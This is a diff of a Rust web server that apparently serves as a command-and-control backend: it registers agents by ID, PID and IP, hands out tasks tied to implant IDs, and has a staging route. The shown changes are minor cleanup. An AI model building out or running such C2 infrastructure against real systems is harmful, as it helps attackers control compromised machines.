@@ -9,7 +9,6 @@ use rocket_sync_db_pools::{
 };
 
 use rocket::{
-    data::{ FromData },
     http::{ Status },
     request::{ self, FromRequest },
     fairing::{ AdHoc },
@@ -166,9 +165,6 @@ impl Agent {
 
         agents::table.order(agents::id.desc()).first(connection)
     }
-
-
-
     //pub fn get_by_agent_id_and_pid(agent_id_: String, password_: String, connection: &//mut PgConnection) -> Option<Agent> {
     //    let res = agents::table
     //        .filter(agents::agent_id.eq(agent_id_))
@@ -210,11 +206,6 @@ fn index() -> &'static str {
     "Hello, world!"
 }
 
-#[get("/test")]
-fn test() -> &'static str {
-    "Hello, agent!"
-}
-
 #[get("/checking")]
 fn apply() -> Json<InsertableAgent> {
     let agent_id = "test".to_string();
@@ -223,7 +214,6 @@ fn apply() -> Json<InsertableAgent> {
 
     Json(InsertableAgent { agent_id, agent_pid, agent_ip })
 }
-
 
 #[post("/submitting", data="<new_agent>")]
 fn test_reg(new_agent: Form<InsertableAgent>) -> Json<InsertableAgent> {
@@ -348,7 +338,7 @@ fn stage_one() -> Json<String> {
     return Json(_x)
 }
 
-//TODO: Make this actually secure
+//TODO: Make this secure
 #[post("/otp-reg", data="<otp>")]
 fn otp_reg(otp: Form<OTPasscode>) -> Status {
     let shh = otp.into_inner();
@@ -362,14 +352,14 @@ fn otp_reg(otp: Form<OTPasscode>) -> Status {
     }
 }
 
-#[post("/new/task", data="<new_task>")]
-fn test_fetch_task(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
-    let _res = new_task.into_inner();
-    Json( NewC2Task { 
-        task: (_res.task), 
-        args: (_res.args), 
-        implant_id: (_res.implant_id) })
-}
+//#[post("/new/task", data="<new_task>")]
+//fn test_fetch_task(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
+//    let _res = new_task.into_inner();
+//    Json( NewC2Task { 
+//        task: (_res.task), 
+//        args: (_res.args), 
+//        implant_id: (_res.implant_id) })
+//}
 
 #[get("/new/tasks")]
 fn test_fetch_commands() -> Json<NewC2Task> {
@@ -454,8 +444,6 @@ fn remove_agent(target_id: String) {
 
     //format!("Successfully removed agent: {:#?} from db.", target_id)
 }
-
-
 
 
 
